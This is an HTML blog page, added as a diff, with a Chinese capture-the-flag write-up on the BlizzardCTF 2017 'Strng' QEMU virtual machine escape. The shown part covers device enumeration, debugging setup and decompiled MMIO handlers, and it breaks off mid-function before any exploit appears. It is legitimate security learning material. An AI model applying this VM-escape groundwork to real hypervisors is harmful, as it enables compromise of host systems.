@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,qemu,vm escape,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="前面的部分更多的是翻译和学习 熟悉题目我们在qemu题目中中经常看到一些简写 内存映射I/O （Memory-mapped I/O —— MMIO）端口映射I/O （port-mapped I/O —— PMIO） qemu的漏洞一般在设备中，这个题目是一个PCI设备模拟器的漏洞 首先看看是哪个设备，可以从qemu的-device参数中看到设备名是strng 12345678910./qemu-s">
+<meta name="keywords" content="pwn,qemu,vm escape">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng">
+<meta property="og:url" content="https://www.giantbranch.cn/2019/12/03/CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="前面的部分更多的是翻译和学习 熟悉题目我们在qemu题目中中经常看到一些简写 内存映射I/O （Memory-mapped I/O —— MMIO）端口映射I/O （port-mapped I/O —— PMIO） qemu的漏洞一般在设备中，这个题目是一个PCI设备模拟器的漏洞 首先看看是哪个设备，可以从qemu的-device参数中看到设备名是strng 12345678910./qemu-s">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1574042814941.jpg">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1575361440288.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1575364082905.png">
+<meta property="og:updated_time" content="2023-10-13T13:14:33.050Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng">
+<meta name="twitter:description" content="前面的部分更多的是翻译和学习 熟悉题目我们在qemu题目中中经常看到一些简写 内存映射I/O （Memory-mapped I/O —— MMIO）端口映射I/O （port-mapped I/O —— PMIO） qemu的漏洞一般在设备中，这个题目是一个PCI设备模拟器的漏洞 首先看看是哪个设备，可以从qemu的-device参数中看到设备名是strng 12345678910./qemu-s">
+<meta name="twitter:image" content="http://pic.giantbranch.cn/pic/1574042814941.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2019/12/03/CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng/">
+
+
+
+
+
+  <title>CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2019/12/03/CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-03T00:00:00+00:00">
+                2019-12-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/12/03/CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/12/03/CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>前面的部分更多的是翻译和学习</p>
+<h1 id="熟悉题目"><a href="#熟悉题目" class="headerlink" title="熟悉题目"></a>熟悉题目</h1><p>我们在qemu题目中中经常看到一些简写</p>
+<p>内存映射I/O （Memory-mapped I/O —— MMIO）<br>端口映射I/O （port-mapped I/O —— PMIO）</p>
+<p>qemu的漏洞一般在设备中，这个题目是一个PCI设备模拟器的漏洞</p>
+<p>首先看看是哪个设备，可以从qemu的-device参数中看到设备名是strng</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure>
+
+<p>由于qemu-system-x86_64程序是有符号的，所以在ida可以搜到相关函数</p>
+<p><img src="http://pic.giantbranch.cn/pic/1574042814941.jpg" alt></p>
+<p>在strng_class_init这函数里面可以看到设备id是0x11E9</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall strng_class_init(ObjectClass_0 *a1, void *data)</span><br><span class="line">&#123;</span><br><span class="line">  ObjectClass_0 *v2; // rax</span><br><span class="line"></span><br><span class="line">  v2 = object_class_dynamic_cast_assert(a1, &quot;pci-device&quot;, &quot;/home/rcvalle/qemu/hw/misc/strng.c&quot;, 154, &quot;strng_class_init&quot;);</span><br><span class="line">  WORD1(v2[2].object_cast_cache[3]) = 0x11E9;</span><br><span class="line">  BYTE4(v2[2].object_cast_cache[3]) = 0x10;</span><br><span class="line">  v2[2].type = (Type)pci_strng_realize;</span><br><span class="line">  HIWORD(v2[2].object_cast_cache[3]) = 0xFF;</span><br><span class="line">  LOWORD(v2[2].object_cast_cache[3]) = 0x1234;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面的数字可以跟下面的倒数第二个意义对应</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure>
+
+<p>-v可以查看更加详细信息，看到内存是0xfebf1000的256字节大小的，PMIO端口是0xc050开始的8个端口号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">	Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">	Physical Slot: 3</span><br><span class="line">	Flags: fast devsel</span><br><span class="line">	Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">	I/O ports at c050 [size=8]</span><br><span class="line">	</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>我们在目录中也可以看到这个设备的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ll /sys/devices/pci0000\:00/0000:00:03.0/</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x  3 root root    0 Nov 18 03:30 ./</span><br><span class="line">drwxr-xr-x 11 root root    0 Nov 18 03:30 ../</span><br><span class="line">-rw-r--r--  1 root root 4096 Nov 18 03:52 broken_parity_status</span><br><span class="line">-r--r--r--  1 root root 4096 Nov 18 03:38 class</span><br><span class="line">-rw-r--r--  1 root root  256 Nov 18 03:38 config</span><br><span class="line">-r--r--r--  1 root root 4096 Nov 18 03:52 consistent_dma_mask_bits</span><br><span class="line">-rw-r--r--  1 root root 4096 Nov 18 03:52 d3cold_allowed</span><br><span class="line">-r--r--r--  1 root root 4096 Nov 18 03:38 device</span><br><span class="line">-r--r--r--  1 root root 4096 Nov 18 03:52 dma_mask_bits</span><br><span class="line">-rw-r--r--  1 root root 4096 Nov 18 03:52 enable</span><br><span class="line">lrwxrwxrwx  1 root root    0 Nov 18 03:52 firmware_node -&gt; ../../LNXSYSTM:00/device:00/PNP0A03:00/device:06/</span><br><span class="line">-r--r--r--  1 root root 4096 Nov 18 03:31 irq</span><br><span class="line">-r--r--r--  1 root root 4096 Nov 18 03:52 local_cpulist</span><br><span class="line">-r--r--r--  1 root root 4096 Nov 18 03:52 local_cpus</span><br><span class="line">-r--r--r--  1 root root 4096 Nov 18 03:52 modalias</span><br><span class="line">-rw-r--r--  1 root root 4096 Nov 18 03:52 msi_bus</span><br><span class="line">drwxr-xr-x  2 root root    0 Nov 18 03:52 power/</span><br><span class="line">--w--w----  1 root root 4096 Nov 18 03:52 remove</span><br><span class="line">--w--w----  1 root root 4096 Nov 18 03:52 rescan</span><br><span class="line">-r--r--r--  1 root root 4096 Nov 18 03:38 resource</span><br><span class="line">-rw-------  1 root root  256 Nov 18 03:52 resource0</span><br><span class="line">-rw-------  1 root root    8 Nov 18 03:52 resource1</span><br><span class="line">lrwxrwxrwx  1 root root    0 Nov 18 03:52 subsystem -&gt; ../../../bus/pci/</span><br><span class="line">-r--r--r--  1 root root 4096 Nov 18 03:52 subsystem_device</span><br><span class="line">-r--r--r--  1 root root 4096 Nov 18 03:52 subsystem_vendor</span><br><span class="line">-rw-r--r--  1 root root 4096 Nov 18 03:30 uevent</span><br><span class="line">-r--r--r--  1 root root 4096 Nov 18 03:38 vendor</span><br></pre></td></tr></table></figure>
+
+<p>查看设备id是device目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/device</span><br><span class="line">0x11e9</span><br></pre></td></tr></table></figure>
+
+<p>查看映射可以看resource（三列分别是开始地址 结束地址 标志），第一行是MMIO，第二行是PMIO</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000:00:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>查看IO端口命令是，我这有点问题，看到的都是0000</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /proc/ioports</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们回到ida，查看pci_strng_realize函数，这里注册了一些MMIO和PMIO的操作，去读写映射的内存</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall pci_strng_realize(PCIDevice_0 *pdev, Error_0 **errp)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v2; // ST08_8</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  memory_region_init_io(</span><br><span class="line">    (MemoryRegion_0 *)&amp;pdev[1],</span><br><span class="line">    &amp;pdev-&gt;qdev.parent_obj,</span><br><span class="line">    &amp;strng_mmio_ops,</span><br><span class="line">    pdev,</span><br><span class="line">    &quot;strng-mmio&quot;,</span><br><span class="line">    0x100uLL);</span><br><span class="line">  pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&amp;pdev[1]);</span><br><span class="line">  memory_region_init_io(</span><br><span class="line">    (MemoryRegion_0 *)&amp;pdev[1].io_regions[0].size,</span><br><span class="line">    &amp;pdev-&gt;qdev.parent_obj,</span><br><span class="line">    &amp;strng_pmio_ops,</span><br><span class="line">    pdev,</span><br><span class="line">    &quot;strng-pmio&quot;,</span><br><span class="line">    8uLL);</span><br><span class="line">  if ( __readfsqword(0x28u) == v2 )</span><br><span class="line">    pci_register_bar(pdev, 1, 1u, (MemoryRegion_0 *)&amp;pdev[1].io_regions[0].size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以第一个strng_mmio_ops，哪里有对于读写对应的函数指针</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000A4A2A0 strng_mmio_ops  dq offset strng_mmio_read; read</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                                         ; DATA XREF: pci_strng_realize+F↑o</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 dq offset strng_mmio_write; write</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 dq 0                    ; read_with_attrs</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 dq 0                    ; write_with_attrs</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 dd DEVICE_NATIVE_ENDIAN ; endianness</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 dd 0                    ; valid.min_access_size</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 dd 0                    ; valid.max_access_size</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 db 0                    ; valid.unaligned</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 db 7 dup(0)</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 dq 0                    ; valid.accepts</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 dd 0                    ; impl.min_access_size</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 dd 0                    ; impl.max_access_size</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 db 0                    ; impl.unaligned</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 db 3 dup(0)</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 dq 3 dup(0)             ; old_mmio.read</span><br><span class="line">.data.rel.ro:0000000000A4A2A0                 dq 3 dup(0)             ; old_mmio.write</span><br></pre></td></tr></table></figure>
+
+<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>这个我直接copy参考文章作者的了，为了方便调试，关闭了aslr，那么PIE也是不起作用了</p>
+<p>还有不推荐使用kvm模式，据说会让你的vm变得很快，具体我之后可能会都试试有什么差别，将原因写在这，也许不会写。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ cat comline.txt</span><br><span class="line">aslr off</span><br><span class="line"># strng_mmio_read</span><br><span class="line">b *0x555555964390</span><br><span class="line"># strng_mmio_write</span><br><span class="line">b *0x5555559643E0</span><br><span class="line"> # strng_pmio_read</span><br><span class="line">b *0x5555559644B0</span><br><span class="line"># strng_pmio_write</span><br><span class="line">b *0x555555964520   </span><br><span class="line"></span><br><span class="line">run  -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -device e1000,netdev=net0 -netdevuser,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure>
+
+<p>-q模式可以让gdb不输出版本信息，更加清爽</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -q ./qemu-system-x86_64</span><br><span class="line">pwndbg: loaded 176 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from ./qemu-system-x86_64...done.</span><br><span class="line">gdb-peda$ source comline.txt</span><br><span class="line">Breakpoint 1 at 0x555555964390</span><br><span class="line">Breakpoint 2 at 0x5555559643e0</span><br><span class="line">Breakpoint 3 at 0x5555559644b0</span><br><span class="line">Breakpoint 4 at 0x555555964520</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[New Thread 0x7ffff627b700 (LWP 26045)]</span><br><span class="line">[New Thread 0x7fffe0dac700 (LWP 26046)]</span><br><span class="line">[New Thread 0x7fffdec0b700 (LWP 26047)]</span><br><span class="line">main-loop: WARNING: I/O thread spun for 1000 iterations</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpuset</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpu</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpuacct</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<h1 id="MMIO相关函数"><a href="#MMIO相关函数" class="headerlink" title="MMIO相关函数"></a>MMIO相关函数</h1><p>我们设置一下opaque的结构体为STRNGState就可以了，不然看到的就只是opaque指针加上偏移了（当然这个题目将源码开源才能知道这个opaque时STRNGState，不然就只能将就这看了）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uint64_t __fastcall strng_mmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)</span><br><span class="line">&#123;</span><br><span class="line">  uint64_t result; // rax</span><br><span class="line"></span><br><span class="line">  result = -1LL;</span><br><span class="line">  if ( size == 4 &amp;&amp; !(addr &amp; 3) )</span><br><span class="line">    result = opaque-&gt;regs[addr &gt;&gt; 2];</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>strng_mmio_read接收地址还有大小，而且需要size为4，而且地址最低两个bit都是0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall strng_mmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)</span><br><span class="line">&#123;</span><br><span class="line">  hwaddr v4; // rsi</span><br><span class="line">  int v5; // ST08_4</span><br><span class="line">  uint32_t v6; // eax</span><br><span class="line">  unsigned __int64 v7; // [rsp+18h] [rbp-20h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  if ( size == 4 &amp;&amp; !(addr &amp; 3) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = addr &gt;&gt; 2;</span><br><span class="line">    if ( (_DWORD)v4 == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      